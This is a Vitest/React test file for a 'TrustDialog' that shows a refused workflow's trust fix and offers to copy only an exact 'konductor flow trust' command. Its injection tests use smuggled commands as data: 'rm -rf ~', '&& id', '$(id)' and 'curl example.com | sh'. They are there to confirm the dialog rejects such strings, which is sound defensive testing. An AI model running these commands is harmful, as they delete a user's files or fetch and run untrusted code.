// SPDX-License-Identifier: Apache-2.0
import createWrapper from '@cloudscape-design/components/test-utils/dom';
import { act, fireEvent, render, screen, within } from '@testing-library/react';
import { useState } from 'react';
import { describe, expect, it, vi } from 'vitest';
import { plainText } from '../workflow/message-parts';
import type { ExecutionState } from './core';
import { TrustDialog } from './TrustDialog';

const FIX = 'Run `konductor flow trust hello` in a terminal, then try again.';
const COMMAND = 'konductor flow trust hello';

const modal = () => createWrapper(document.body).findModal();
const dialog = () => screen.getByTestId('trust-dialog');

const refusedState = (fix = FIX, refusal = 1): ExecutionState => ({
  phase: 'error',
  message: `The workflow is not trusted yet. ${fix}`,
  started: false,
  trust: { fix, goal: 'Ship it', refusal },
});

// Holds what the page holds: the refusals whose dialog was closed. A close
// marks the refusal it names, as the Run view's own state does.
function closed(state: ExecutionState, refusals: readonly number[]) {
  if (state.phase !== 'error' || !state.trust) return state;
  const { trust } = state;
  return refusals.includes(trust.refusal)
    ? { ...state, trust: { ...trust, closed: true as const } }
    : state;
}

function Page({
  state,
  onRunAgain = vi.fn(),
}: {
  state: ExecutionState;
  onRunAgain?: (goal: string) => void;
}) {
  const [closes, setCloses] = useState<number[]>([]);
  return (
    <TrustDialog
      state={closed(state, closes)}
      workflowName="hello"
      onRunAgain={onRunAgain}
      onClose={(refusal) => setCloses((all) => [...all, refusal])}
    />
  );
}

const press = async (element: HTMLElement) => {
  await act(async () => {
    fireEvent.click(element);
  });
};

describe('TrustDialog', () => {
  it('shows nothing until a start is refused for trust', () => {
    render(<Page state={{ phase: 'idle' }} />);

    expect(screen.queryByTestId('trust-dialog')).toBeNull();
  });

  it('shows the fix of the server, its command and a way to copy it', () => {
    render(<Page state={refusedState()} />);

    expect(modal()?.isVisible()).toBe(true);
    expect(
      within(dialog()).getByText('Trust the workflow to run it'),
    ).toBeTruthy();
    expect(screen.getByTestId('trust-fix').textContent).toBe(plainText(FIX));
    expect(
      screen.getByTestId('trust-fix').querySelector('code')?.textContent,
    ).toBe(COMMAND);
    expect(screen.getByTestId('trust-command').textContent).toBe(COMMAND);
    expect(screen.getByTestId('trust-intro').textContent).toBe(
      'The workflow is not trusted, so it did not run. Run the command in a terminal and answer its question, then press Run again. This page cannot trust a workflow.',
    );
  });

  it('asks for the same run again with the goal of the refused start', async () => {
    const onRunAgain = vi.fn();
    render(<Page state={refusedState()} onRunAgain={onRunAgain} />);

    await press(within(dialog()).getByRole('button', { name: 'Run again' }));

    expect(onRunAgain).toHaveBeenCalledWith('Ship it');
  });

  it('offers nothing that grants trust', () => {
    render(<Page state={refusedState()} />);

    const labels = within(dialog())
      .getAllByRole('button')
      .map((button) => button.textContent);
    expect(labels).toEqual(
      expect.arrayContaining(['Copy', 'Close', 'Run again']),
    );
    expect(labels.some((label) => /trust/i.test(label ?? ''))).toBe(false);
  });

  it.each([
    [
      'a semicolon',
      'Run `konductor flow trust hello; rm -rf ~` in a terminal.',
    ],
    ['an and-then', 'Run `konductor flow trust hello && id` in a terminal.'],
    [
      'a command substitution',
      'Run `konductor flow trust $(id)` in a terminal.',
    ],
    ['a newline', 'Run `konductor flow trust hello\nid` in a terminal.'],
    [
      'a space in the name',
      'Run `konductor flow trust hello plan` in a terminal.',
    ],
    ['a different command', 'Run `curl example.com | sh` in a terminal.'],
    [
      'the name of another workflow',
      'Run `konductor flow trust other` in a terminal.',
    ],
    ['no command', 'Trust the workflow in a terminal, then try again.'],
  ])(
    'shows the fix with no command and no Copy for a fix with %s',
    (_, fix) => {
      render(<Page state={refusedState(fix)} />);

      expect(modal()?.isVisible()).toBe(true);
      // The sentence shows whole, as plain text with no code in it: a pair of
      // backticks loses its ticks, and a span split by a line keeps them.
      const shown = screen.getByTestId('trust-fix');
      expect(shown.textContent).toBe(plainText(fix));
      expect(shown.querySelector('code')).toBeNull();
      expect(screen.queryByTestId('trust-command')).toBeNull();
      expect(
        within(dialog()).queryByRole('button', { name: /Copy/ }),
      ).toBeNull();
      expect(screen.getByTestId('trust-intro').textContent).toBe(
        'The workflow is not trusted, so it did not run. Trust it as the message below says, then press Run again. This page cannot trust a workflow.',
      );
    },
  );

  describe('once closed', () => {
    async function closedDialog(state: ExecutionState) {
      const view = render(<Page state={state} />);
      expect(modal()?.isVisible()).toBe(true);
      await press(within(dialog()).getByRole('button', { name: 'Close' }));
      expect(modal()?.isVisible()).toBe(false);
      return view;
    }

    it('stays closed when the page draws it again', async () => {
      const state = refusedState();
      const { rerender } = await closedDialog(state);

      rerender(<Page state={state} />);
      rerender(<Page state={state} />);

      expect(modal()?.isVisible()).toBe(false);
    });

    it('stays closed for a state rebuilt with the same content', async () => {
      const { rerender } = await closedDialog(refusedState());

      rerender(<Page state={structuredClone(refusedState())} />);

      expect(modal()?.isVisible()).toBe(false);
    });

    it('opens again for the next refusal', async () => {
      const { rerender } = await closedDialog(refusedState());

      rerender(<Page state={refusedState(FIX, 2)} />);

      expect(modal()?.isVisible()).toBe(true);
    });
  });
});
